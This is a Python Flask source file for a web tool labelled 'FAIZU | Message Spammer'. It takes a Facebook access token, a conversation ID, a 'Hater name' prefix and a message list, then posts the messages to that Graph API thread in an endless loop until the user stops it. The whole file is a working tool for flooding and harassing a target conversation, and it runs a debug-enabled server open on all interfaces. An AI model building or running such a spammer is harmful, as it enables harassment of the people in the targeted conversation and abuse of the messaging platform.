from flask import Flask, request, render_template_string, redirect
import threading
import requests
import time

app = Flask(__name__)
app.debug = True

# Store running threads with keys
active_threads = {}

# Frontend HTML template
html_code = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FAIZU TOOL | Convo Loader</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(to right, #1f4037, #99f2c8);
      font-family: 'Segoe UI', sans-serif;
      color: white;
    }
    .box {
      max-width: 600px;
      margin: 80px auto;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(255,255,255,0.2);
    }
    .box h2 {
      text-align: center;
      margin-bottom: 30px;
      font-weight: bold;
    }
    .btn-submit {
      background: #00ffae;
      border: none;
      color: black;
      font-weight: bold;
    }
    .btn-submit:hover {
      background: #00ffaa;
      color: white;
    }
    .btn-stop {
      background: #ff4d4d;
      border: none;
      color: white;
      font-weight: bold;
    }
    footer {
      text-align: center;
      margin-top: 30px;
      font-size: 14px;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>FAIZU | Message Spammer</h2>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>Access Token:</label>
        <input type="text" class="form-control" name="accessToken" required />
      </div>
      <div class="mb-3">
        <label>Thread ID (Convo ID):</label>
        <input type="text" class="form-control" name="threadId" required />
      </div>
      <div class="mb-3">
        <label>Prefix Name (e.g., Hater name):</label>
        <input type="text" class="form-control" name="kidx" required />
      </div>
      <div class="mb-3">
        <label>Select Message List (.txt):</label>
        <input type="file" class="form-control" name="txtFile" accept=".txt" required />
      </div>
      <div class="mb-3">
        <label>Message Delay (in seconds):</label>
        <input type="number" class="form-control" name="time" min="1" required />
      </div>
      <button type="submit" class="btn btn-submit w-100">Start Bot</button>
    </form>
    <form action="/stop" method="post" style="margin-top: 15px;">
      <button type="submit" class="btn btn-stop w-100">Stop All Bots</button>
    </form>
  </div>
  <footer>
    Developed by <strong>Stuner</strong> | 2024 All Rights Reserved
  </footer>
</body>
</html>
'''

# Thread function
def message_sender(access_token, thread_id, mn, time_interval, messages, thread_key):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'referer': 'www.google.com'
    }

    print(f"\n[🔵 STARTED] Thread ID: {thread_id}")
    print(f"Token: {access_token[:25]}... (partially shown)")
    print(f" Prefix: {mn}")
    print(f"⏱ Delay: {time_interval}s |  Messages: {len(messages)}")
    print(f"Thread Key: {thread_key}\n")

    while active_threads.get(thread_key, False):
        for msg in messages:
            if not active_threads.get(thread_key, False):
                break
            try:
                message = f"{mn} {msg}"
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                parameters = {'access_token': access_token, 'message': message}
                r = requests.post(api_url, data=parameters, headers=headers)

                status = "✅ Sent" if r.status_code == 200 else f"❌ Fail ({r.status_code})"
                print(f"[{status}] {message}")
                time.sleep(time_interval)
            except Exception as e:
                print(f"[❗ Error] {e}")
                time.sleep(10)

    print(f"\n[🔴 STOPPED] Thread ID: {thread_id} | Prefix: {mn}\n")

# Main route
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        messages = request.files['txtFile'].read().decode().splitlines()

        thread_key = f"{thread_id}_{access_token[:5]}"
        active_threads[thread_key] = True

        thread = threading.Thread(
            target=message_sender,
            args=(access_token, thread_id, mn, time_interval, messages, thread_key)
        )
        thread.daemon = True
        thread.start()

        return f'<h2>started for thread <b>{thread_id}</b>. Console will show logs.</h2>'

    return render_template_string(html_code)

# Stop route
@app.route('/stop', methods=['POST'])
def stop_all():
    print("\n🛑 [STOP] Requested! Stopping All Running Threads...\n")
    for key in active_threads:
        active_threads[key] = False
    return redirect("/")

# Start server
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
